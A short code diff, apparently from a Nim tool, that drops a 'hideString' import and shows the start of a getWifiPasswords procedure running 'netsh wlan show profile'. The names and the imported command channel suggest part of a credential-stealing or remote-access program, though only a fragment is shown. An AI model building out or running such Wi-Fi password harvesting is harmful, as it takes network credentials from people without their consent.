@@ -9,8 +9,6 @@ import ../functions/runCmd
 
 from ../channels import mainChannel
 
-import ../functions/hideString
-
 proc getWifiPasswords(): void =
   let netshOutout1: string = runCmd "netsh wlan show profile"
 
